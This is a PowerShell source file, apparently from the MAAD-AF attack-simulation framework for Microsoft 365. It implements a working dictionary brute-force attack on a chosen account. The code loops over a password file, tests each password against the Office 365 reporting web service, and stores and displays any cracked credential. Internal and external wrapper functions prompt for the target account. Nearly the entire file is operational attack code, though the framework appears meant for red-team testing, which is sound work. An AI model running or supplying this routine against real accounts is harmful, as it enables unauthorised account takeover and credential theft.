###Primary Bruteforce function
function BruteForce ($target_account){
    #Check file input
    $check_file = $false
    while ($check_file -eq $false) {
        MAADWriteInfo "Place passwords file in -> \MAAD-AF\Local\"
        $filename = Read-Host -Prompt "`nEnter passwords file name (eg: passwords.txt)"
        Write-Host ""
        $filename = $filename.Trim()
        $check_file = Test-Path -Path .\Local\$filename
        
        if ($check_file -and $filename -ne "") {
            MAADWriteProcess "File found -> $filename"
            #Check file format - Only txt files accepted
            $extn = [IO.Path]::GetExtension($filename) 
            if ($extn -ne ".txt") {
                MAADWriteError "Invalid file type: Provide 'txt' dictionary file with one password per line"
                $check_file = $false
            }
            else {
                $check_file = $true
            } 
        }
        else {
            MAADWriteError "File not found -> $filename"
            MAADWriteInfo "Check -> Spelling is correct"
            MAADWriteInfo "Check -> File exists in directory \MAAD-AF\Local\"
            MAADWriteInfo "Include extension in filename"
            $check_file = $false
        }
    }
    
    #Read input password file
    $passwords = Get-Content -Path .\Local\$filename

    MAADWriteProcess "Target User -> $target_account"
    MAADWriteProcess "Password Dictionary -> $filename"
    MAADWriteProcess "Starting brute-force"
    [int]$counter = 0
    Write-Progress -Activity "Running brute force" -Status "0% complete:" -PercentComplete 0;

    #Perform Brute-force.
    foreach ($password in $passwords) {
        #Convert password to secure string.
        $securestring = ConvertTo-SecureString $password -AsPlainText -Force

        #Create PSCredential object
        $credential = New-Object System.Management.Automation.PSCredential -ArgumentList ($target_account, $securestring)

        #Test authentication to Office 365 reporting API
        try {
            Invoke-WebRequest -Uri "https://reports.office365.com/ecp/reportingwebservice/reporting.svc" -Credential $credential -UseBasicParsing | Out-Null
            $bruteforce_success = $true

            #Save to cracked credntial to credential store
            AddCredentials "password" "BF_$target_account-$(([DateTimeOffset](Get-Date)).ToUnixTimeSeconds())" $target_account $password
            MAADWriteProcess "Username -> $target_account"
            MAADWriteProcess "Password -> $password"
            MAADWriteSuccess "Cracked Password"
            break
        } 
        catch {
            $counter++
            Write-Progress -Activity "Running brute-force attack" -Status "$([math]::Round($counter/$passwords.Count * 100))% complete:" -PercentComplete ([math]::Round($counter / $passwords.Count * 100));
        }
    }

    #Brute-force unsuccessful
    if ($bruteforce_success -ne $true ){
        MAADWriteError "Password not found"
    }
    MAADPause
}

###Internal Bruteforce function
function InternalBruteForce {
    mitre_details("BruteForce")

    #Get account to target
    EnterAccount "`n[?] Enter account to brute-force (eg:user@org.com)"
    $target_account = $global:account_username

    BruteForce($target_account)
}

###External Bruteforce function
function ExternalBruteForce {
    mitre_details("BruteForce")

    #Get account to target
    do {
        $target_account = Read-Host -Prompt "`n[?] Enter account to brute-force (eg:user@org.com)"
        Write-Host ""
    } until ("" -ne $target_account)

    BruteForce($target_account)
}